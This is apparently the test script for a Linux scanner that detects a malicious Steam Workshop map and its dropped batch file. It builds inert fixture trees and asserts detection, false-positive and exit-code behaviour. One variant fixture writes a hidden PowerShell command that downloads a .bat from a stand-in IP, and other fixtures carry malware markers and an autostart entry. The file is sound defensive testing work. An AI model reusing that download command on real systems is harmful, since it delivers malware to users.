#!/usr/bin/env bash
# Builds a throwaway fixture tree and runs scan-linux.sh against it, asserting
# that every check fires. Also runs the scanner against a clean tree to prove
# it reports nothing found -- and that it still prints the "this is not proof
# you are clean" caveat.
#
# Fixtures are generated here rather than committed: a repo containing a .bat
# with the real payload string would be flagged by antivirus and by GitHub.
# Everything written below is inert -- echo statements only -- and the marker
# string is assembled from fragments at runtime.

set -uo pipefail

HERE="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(dirname "$HERE")"
FIX="$HERE/fixtures"
SCANNER="$REPO/scan-linux.sh"
APPID=4704690

PASS=0; FAIL=0
ok()   { printf '  \033[1;32mPASS\033[0m  %s\n' "$1"; PASS=$((PASS+1)); }
bad()  { printf '  \033[1;31mFAIL\033[0m  %s\n' "$1"; FAIL=$((FAIL+1)); }

# Assembled at runtime so no file in this repo contains a live payload URL.
MARK_IP="31.57"".34.228"
MARK_BAT="steamb"".bat"

rm -rf "$FIX"
mkdir -p "$FIX"

# ------------------------------------------------------------ infected tree

DIRTY="$FIX/dirty"
WS="$DIRTY/steamroot/steamapps/workshop/content/$APPID"
PFX="$DIRTY/steamroot/steamapps/compatdata/$APPID/pfx/drive_c/users/steamuser"

mkdir -p "$WS/3765145606" "$WS/9999999999" "$WS/7777777777" "$WS/1111111111"
mkdir -p "$PFX/Documents" "$DIRTY/home/Documents" "$DIRTY/home/.config/autostart"

# A map whose ID is on the known-bad list (check 2).
printf 'harmless placeholder\n' > "$WS/3765145606/map.pak"

# A .pak carrying the marker as UTF-16LE, like an Unreal string literal (check 4).
#   iconv turns the ASCII marker into UTF-16LE; the scanner strips NUL bytes.
{
    printf 'PAKFILEHEADER\x00\x00'
    printf '%s' "$MARK_IP" | iconv -f ASCII -t UTF-16LE
    printf '\x00\x00PADDING'
} > "$WS/9999999999/marker.pak"

# A .pak we will pin by hash (check 3).
printf 'this stands in for the known malicious pak\n' > "$WS/7777777777/known.pak"
KNOWN_HASH="$(sha256sum "$WS/7777777777/known.pak" | cut -d' ' -f1)"

# A perfectly ordinary map, to prove we do not flag everything.
printf 'a completely normal community map\n' > "$WS/1111111111/clean.pak"

# The dropped file, in the Proton prefix where it actually lands (check 5).
cat > "$PFX/Documents/s.bat" <<'EOF'
@echo off
echo inert test fixture - this file does nothing
EOF

# A renamed variant carrying a marker (check 5, renamed-file path).
{
    printf '@echo off\r\n'
    printf 'echo inert test fixture\r\n'
    printf 'REM %s\r\n' "$MARK_BAT"
} > "$DIRTY/home/Documents/notes.cmd"

# A startup entry referring to the malware (check 6).
cat > "$DIRTY/home/.config/autostart/evil.desktop" <<EOF
[Desktop Entry]
Type=Application
Name=Definitely Not Malware
Exec=/bin/true $MARK_BAT
EOF

# Test indicator file: same schema, but with one hash swapped for our stand-in
# so the hash-matching path is genuinely exercised.
TEST_IOC="$FIX/indicators.test.json"
sed "s/1ff540bc3c493a93059e602b414ba61027ed1a2b8a079f6197b0718f4a2101b6/$KNOWN_HASH/" \
    "$REPO/indicators.json" > "$TEST_IOC"

# ---------------------------------------------------------------- clean tree

CLEAN="$FIX/clean"
mkdir -p "$CLEAN/steamroot/steamapps/workshop/content/$APPID/2222222222"
mkdir -p "$CLEAN/home/Documents" "$CLEAN/home/.config/autostart"
printf 'a completely normal community map\n' \
    > "$CLEAN/steamroot/steamapps/workshop/content/$APPID/2222222222/nice.pak"

# ------------------------------------------------------------- variant tree
#
# A repackaged copy of the same malware: different Workshop ID, different file
# contents, different server. Every published indicator misses it. This is the
# case --deep exists for, and the realistic one -- replacement maps appeared
# within hours of each takedown.

VAR="$FIX/variant"
VWS="$VAR/steamroot/steamapps/workshop/content/$APPID/4242424242"
mkdir -p "$VWS" "$VAR/home/Documents" "$VAR/home/.config/autostart"

# Same dropper behaviour, none of the known strings.
{
    printf '@echo off\r\n'
    printf 'if not defined _Q set _Q=1 ^& start /min cmd /c %%~f0 ^& exit\r\n'
    printf 'powershell -w hidden -ep bypass -c iwr http://198.51.100.77/x/p.bat -OutFile %%TEMP%%\\p.bat\r\n'
    printf 'echo inert test fixture\r\n'
} > "$VAR/home/Documents/update_helper.bat"

# A map reaching for capability it has no business having.
{
    printf 'PAKFILEHEADER\x00\x00'
    printf 'GetPlatformUserDir'
    printf '\x00\x00SaveStringToFile\x00\x00PADDING'
} > "$VWS/newmap.pak"

# ------------------------------------------------------------------ run them

echo
echo "  Scanning the INFECTED fixture tree"
echo "  ----------------------------------"
OUT_DIRTY="$(bash "$SCANNER" --scan-root "$DIRTY" --indicators "$TEST_IOC" --no-color 2>&1)"
RC_DIRTY=$?

echo "$OUT_DIRTY" | sed 's/^/  | /'
echo

has() { echo "$OUT_DIRTY" | grep -qF -- "$1"; }

has "Known malicious Workshop map is installed (ID 3765145606)" \
    && ok "check 2  known-bad Workshop ID"        || bad "check 2  known-bad Workshop ID"
has "matches a known malicious file exactly" \
    && ok "check 3  file hash match"              || bad "check 3  file hash match"
has "Map file contains a known malware marker" \
    && ok "check 4  UTF-16 marker inside .pak"    || bad "check 4  UTF-16 marker inside .pak"
has "where the malware drops its file" \
    && ok "check 5  s.bat in the Proton prefix"   || bad "check 5  s.bat in the Proton prefix"
has "A script here contains a known malware marker" \
    && ok "check 5b renamed .cmd variant"         || bad "check 5b renamed .cmd variant"
has "A startup entry refers to the malware" \
    && ok "check 6  autostart persistence"        || bad "check 6  autostart persistence"
has "This tool has changed nothing" \
    && ok "states that nothing was modified"      || bad "states that nothing was modified"
echo "$OUT_DIRTY" | grep -qF "clean.pak" \
    && bad "did NOT flag the innocent map"        || ok "did not flag the innocent map"
[ "$RC_DIRTY" -eq 1 ] \
    && ok "exit code 1 when indicators found"     || bad "exit code 1 when indicators found (got $RC_DIRTY)"

echo
echo "  Scanning the CLEAN fixture tree"
echo "  ------------------------------"
OUT_CLEAN="$(bash "$SCANNER" --scan-root "$CLEAN" --indicators "$REPO/indicators.json" --no-color 2>&1)"
RC_CLEAN=$?

echo "$OUT_CLEAN" | sed 's/^/  | /'
echo

echo "$OUT_CLEAN" | grep -qF "No known indicators of this malware were found" \
    && ok "reports nothing found"                 || bad "reports nothing found"
echo "$OUT_CLEAN" | grep -qF "not proof that you are clean" \
    && ok "keeps the 'not proof you are clean' caveat" \
    || bad "keeps the 'not proof you are clean' caveat"
[ "$RC_CLEAN" -eq 0 ] \
    && ok "exit code 0 when nothing found"        || bad "exit code 0 when nothing found (got $RC_CLEAN)"

# --------------------------------------------- refuses to run without IOCs

echo
echo "  Corrupt indicator file"
echo "  ----------------------"
printf '{ "broken": true }\n' > "$FIX/bad.json"
bash "$SCANNER" --scan-root "$CLEAN" --indicators "$FIX/bad.json" --no-color >/dev/null 2>&1
[ $? -eq 2 ] \
    && ok "exits 2 rather than reporting a false 'clean'" \
    || bad "exits 2 rather than reporting a false 'clean'"

# --------------------------------------- repackaged variant, --deep vs not

echo
echo "  Repackaged variant (new ID, new hash, new server)"
echo "  -------------------------------------------------"

OUT_VAR_IOC="$(bash "$SCANNER" --scan-root "$VAR" --indicators "$REPO/indicators.json" --no-color 2>&1)"
RC_VAR_IOC=$?
OUT_VAR_DEEP="$(bash "$SCANNER" --deep --scan-root "$VAR" --indicators "$REPO/indicators.json" --no-color 2>&1)"
RC_VAR_DEEP=$?

# This is the honest limitation, asserted rather than hand-waved: without
# --deep, a repackaged copy is invisible.
echo "$OUT_VAR_IOC" | grep -qF "No known indicators of this malware were found" \
    && ok "IOC-only mode misses the variant (documents the limitation)" \
    || bad "IOC-only mode misses the variant (documents the limitation)"
[ "$RC_VAR_IOC" -eq 0 ] \
    && ok "IOC-only exits 0 on the variant"       || bad "IOC-only exits 0 on the variant (got $RC_VAR_IOC)"

echo "$OUT_VAR_DEEP" | grep -qF "behaves like the malware" \
    && ok "--deep catches the dropper pattern"    || bad "--deep catches the dropper pattern"
echo "$OUT_VAR_DEEP" | grep -qF "launch programs, which maps do not need" \
    && ok "--deep catches Unreal capability abuse" || bad "--deep catches Unreal capability abuse"
echo "$OUT_VAR_DEEP" | grep -qF "worth a look" \
    && ok "--deep wording avoids claiming infection" \
    || bad "--deep wording avoids claiming infection"
echo "$OUT_VAR_DEEP" | grep -qF "Do not panic" \
    && ok "--deep tells the user most hits are false alarms" \
    || bad "--deep tells the user most hits are false alarms"
[ "$RC_VAR_DEEP" -eq 3 ] \
    && ok "--deep exits 3 for behaviour-only hits" || bad "--deep exits 3 for behaviour-only hits (got $RC_VAR_DEEP)"

# The clean tree must stay clean even in deep mode -- otherwise the flag is
# useless noise.
OUT_CLEAN_DEEP="$(bash "$SCANNER" --deep --scan-root "$CLEAN" --indicators "$REPO/indicators.json" --no-color 2>&1)"
RC_CLEAN_DEEP=$?
[ "$RC_CLEAN_DEEP" -eq 0 ] \
    && ok "--deep stays quiet on a clean system"  || bad "--deep stays quiet on a clean system (got $RC_CLEAN_DEEP)"

# ------------------------------------ behaviour corpus: evasion + benign
#
# The corpus is the real contract for --deep. Detection has to survive an
# attacker rewriting the dropper, and it has to stay silent on ordinary files.
# Both halves are load-bearing: a scanner that flags everything is as useless
# as one that flags nothing, because the audience cannot tell the difference.

echo
echo "  Behaviour corpus"
echo "  ----------------"

# shellcheck source=corpus.sh
. "$HERE/corpus.sh"
CORP="$FIX/corpus"
corpus_build "$CORP"

EV_ROOT="$FIX/ev"; BN_ROOT="$FIX/bn"
mkdir -p "$EV_ROOT/home/Documents" "$EV_ROOT/steamroot/steamapps"
mkdir -p "$BN_ROOT/home/Documents" "$BN_ROOT/steamroot/steamapps"
cp -r "$CORP/evasion/." "$EV_ROOT/home/Documents/"
cp    "$CORP/benign/"*  "$BN_ROOT/home/Documents/"

EV_TOTAL=$(find "$CORP/evasion" -type f | wc -l)
OUT_EV="$(bash "$SCANNER" --deep --scan-root "$EV_ROOT" --indicators "$REPO/indicators.json" --no-color 2>&1)"
RC_EV=$?
EV_HITS=$(printf '%s' "$OUT_EV" | grep -c 'behaves like the malware' || true)

printf '  evasion variants detected: %s/%s\n' "$EV_HITS" "$EV_TOTAL"
[ "$EV_HITS" -eq "$EV_TOTAL" ] \
    && ok "every evasion variant is detected"     || bad "every evasion variant is detected ($EV_HITS/$EV_TOTAL)"
[ "$RC_EV" -eq 3 ] \
    && ok "evasion corpus exits 3"                || bad "evasion corpus exits 3 (got $RC_EV)"

# Name the specific regressions that motivated the rewrite, so a future change
# that reintroduces one fails with a message saying which.
for spec in "02-abbrev-irm:parameter abbreviation and Invoke-RestMethod" \
            "04-base64:fully base64-encoded payload" \
            "05-caret:batch caret obfuscation" \
            "08-mshta:mshta as the downloader" \
            "15-subfolder:dropper in a Documents SUBfolder"; do
    f="${spec%%:*}"; desc="${spec#*:}"
    printf '%s' "$OUT_EV" | grep -q "$f" \
        && ok "catches $desc"                     || bad "catches $desc"
done

# The base64 variant must be scored on its DECODED contents, not merely on the
# fact that something is encoded -- otherwise the decoder is decoration.
printf '%s' "$OUT_EV" | grep -A0 '04-base64' >/dev/null 2>&1
printf '%s' "$OUT_EV" | grep -B1 '04-base64' | grep -qE 'runs downloaded text as code|downloads a file using .NET' \
    && ok "base64 payload is decoded and scored, not just noticed" \
    || bad "base64 payload is decoded and scored, not just noticed"

OUT_BN="$(bash "$SCANNER" --deep --scan-root "$BN_ROOT" --indicators "$REPO/indicators.json" --no-color 2>&1)"
RC_BN=$?
BN_HITS=$(printf '%s' "$OUT_BN" | grep -c 'behaves like the malware' || true)

printf '  benign scripts flagged:    %s (want 0)\n' "$BN_HITS"
[ "$BN_HITS" -eq 0 ] \
    && ok "no false positives on ordinary scripts" || bad "no false positives on ordinary scripts ($BN_HITS)"
[ "$RC_BN" -eq 0 ] \
    && ok "benign corpus exits 0"                  || bad "benign corpus exits 0 (got $RC_BN)"
printf '%s' "$OUT_BN" | grep -q 'WORTH A LOOK' \
    && bad "benign corpus raises no alarms at all" || ok "benign corpus raises no alarms at all"

# Losing the rule file must fail loudly rather than report a clean deep scan.
mv "$REPO/behaviour-rules.tsv" "$FIX/rules.bak"
bash "$SCANNER" --deep --scan-root "$BN_ROOT" --indicators "$REPO/indicators.json" --no-color >/dev/null 2>&1
[ $? -eq 2 ] \
    && ok "missing behaviour rules exits 2, not a false 'clean'" \
    || bad "missing behaviour rules exits 2, not a false 'clean'"
mv "$FIX/rules.bak" "$REPO/behaviour-rules.tsv"

# ------------------------------------------- indicator parsing is exact
#
# Regression test for a real bug: a sed line range meant content_strings
# swallowed the following key's values, and dropped_filenames ran to EOF.
# The scan still "worked", it just quietly matched the wrong things -- which
# is invisible in normal output, hence this assertion.

echo
echo "  Indicator parsing"
echo "  -----------------"
DUMP="$(DUMP_INDICATORS=1 bash "$SCANNER" --indicators "$REPO/indicators.json" 2>&1)"

[ "$(echo "$DUMP" | grep -c '^STRING=')" -eq 4 ] \
    && ok "parses exactly 4 content strings" \
    || bad "parses exactly 4 content strings (got $(echo "$DUMP" | grep -c '^STRING='))"
[ "$(echo "$DUMP" | grep -c '^DROP=')" -eq 1 ] \
    && ok "parses exactly 1 dropped filename" \
    || bad "parses exactly 1 dropped filename (got $(echo "$DUMP" | grep -c '^DROP='))"
echo "$DUMP" | grep -qE '^(STRING|DROP)=(dropped_filenames|blueprint_asset|BP_AmbientController)' \
    && bad "no key names leaked into the indicator lists" \
    || ok "no key names leaked into the indicator lists"
[ "$(echo "$DUMP" | grep -c '^HASH=')" -eq 4 ] \
    && ok "parses exactly 4 hashes" \
    || bad "parses exactly 4 hashes (got $(echo "$DUMP" | grep -c '^HASH='))"

# ---------------------------------------------------- indicator validator

echo
echo "  Indicator validator"
echo "  -------------------"
bash "$REPO/tools/validate-indicators.sh" "$REPO/indicators.json" >/dev/null 2>&1 \
    && ok "the shipped indicators.json passes validation" \
    || bad "the shipped indicators.json passes validation"

printf '{ "steam_appid": "4704690", "malicious_workshop_ids": [{"id":"abc"}], "file_hashes_sha256": {"tooshort":"x"}, "content_strings": [".bat"], "dropped_filenames": ["s.bat"], "updated": "2026-07-26" }\n' \
    > "$FIX/invalid.json"
bash "$REPO/tools/validate-indicators.sh" "$FIX/invalid.json" >/dev/null 2>&1 \
    && bad "validator rejects a bad hash, non-numeric ID and generic string" \
    || ok "validator rejects a bad hash, non-numeric ID and generic string"

# ------------------------------------------------------------------ summary

rm -f "$REPO"/meccha-check-report-*.txt 2>/dev/null

echo
echo "  ============================================"
printf '   %d passed, %d failed\n' "$PASS" "$FAIL"
echo "  ============================================"
echo
[ "$FAIL" -eq 0 ] || exit 1
